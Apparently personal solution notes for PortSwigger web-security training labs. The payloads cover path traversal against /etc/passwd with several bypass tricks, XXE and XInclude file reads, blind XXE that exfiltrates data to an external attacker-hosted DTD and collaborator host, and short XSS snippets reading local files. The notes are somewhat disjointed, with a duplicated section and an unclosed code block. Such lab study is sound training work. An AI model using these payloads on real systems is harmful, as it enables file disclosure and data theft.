# Read files:

# traversal

1. Lab: File path traversal, simple case
https://portswigger.net/web-security/file-path-traversal/lab-simple

To solve the lab, retrieve the contents of the /etc/passwd file. 

request:
GET /image?filename=../../../etc/passwd HTTP/1.1

# traversed!

2. Lab: File path traversal, traversal sequences blocked with absolute path bypass
https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

 The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file. 

req:
GET /image?filename=/etc/passwd HTTP/1.1

(using full path from root/)

# traversed!

3. Lab: File path traversal, traversal sequences stripped non-recursively
https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

hint: You might be able to use nested traversal sequences, such as ....// or ....\/, which will revert to simple traversal sequences when the inner sequence is stripped. 

GET /image?filename=....//....//....//etc/passwd HTTP/1.1

# traversed!

4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

GET /image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd HTTP/1.1

('../../etc/passwd' urlencoded X2)

# traversed!


5. Lab: File path traversal, validation of start of path
https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

 To solve the lab, retrieve the contents of the /etc/passwd file. 

 if an application requires that the user-supplied filename must start with the expected base folder, such as /var/www/images, then it might be possible to include the required base folder followed by suitable traversal sequences. For example:

```htm
        filename=/var/www/images/../../../etc/passwd
```
request:
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1


# traversed!


6. Lab: File path traversal, validation of file extension with null byte bypass
https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

 If an application requires that the user-supplied filename must end with an expected file extension, such as .png, then it might be possible to use a null byte to effectively terminate the file path before the required extension. For example:
filename=../../../etc/passwd%00.png

request:
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1





# XML

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 

**request**:
```xml
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>
&aparecium;
</productId><storeId>2</storeId></stockCheck>
```
To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 


**what we know:**
EC2 metadata endpoint -  http://169.254.169.254/

1. **request1**: test vilnerability
```xml
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>
&aparecium;
</productId><storeId>2</storeId></stockCheck>

 This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. 

**hint**: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn't valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior. 

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
<!-- examples: https://en.wikipedia.org/wiki/XInclude -->

To solve the lab, exfiltrate the contents of the /etc/hostname file. 

materials:
**exfiltrate payload:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

# ***3. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD***
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

 This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file. 

materials:
**exfiltrate payload:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**to be hosted in exploit server address:**
    http://web-attacker.com/malicious.dtd

**payload submission to victim:**
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>

colaborateor:
    g0hojfqbweb8xmmqqid4qsobw22uqj.oastify.com


1.  craft a payload to exfiltrate content (stage2) - to be hosted on exploit server.
*(after failing with exfiltrating /etc/passwd (beacause of new line characters not being parsed by XML - replace target to /etc/hostname)* 

```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://1su9b0iwoz3tp7ebi35pidgwonuhi6.oastify.com/?x=%file;'>">
    %eval;
    %exfiltrate;
```

2. the payload address:
```
https://exploit-0a800077030e429cc0801b93010e00aa.exploit-server.net/exploit.dtd
```

3. craft payload for entry-site (stage1)
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a800077030e429cc0801b93010e00aa.exploit-server.net/exploit.dtd"> %xxe;]>
```
4. send to vulnerable site:
**request**:
```xml
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a800077030e429cc0801b93010e00aa.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

5. observe in colaborator:
```
GET /?x=7369a26b5cf0 HTTP/1.1
```
6. enter the value of x as solution

# Lab Solved

# ***5. Lab: Exploiting blind XXE to retrieve data via error messages***
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD. 

1. craft stage2 in exploit server:
```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
exploit address:
```
https://exploit-0ad500af0411182dc0d25d9d0116009f.exploit-server.net/exploit.dtd
```
2. craft payload for entry-site (stage1)
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ad500af0411182dc0d25d9d0116009f.exploit-server.net/exploit.dtd"> %xxe;]>

send stage 1:
**request**:
    POST /product/stock HTTP/1.1

    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ad500af0411182dc0d25d9d0116009f.exploit-server.net/exploit.dtd"> %xxe;]>

response:
    HTTP/1.1 400 Bad Request

    "XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    ...

# Lab Solved


# XSS

<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>

{{ '<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");alert(x.responseText);</script>' }} -->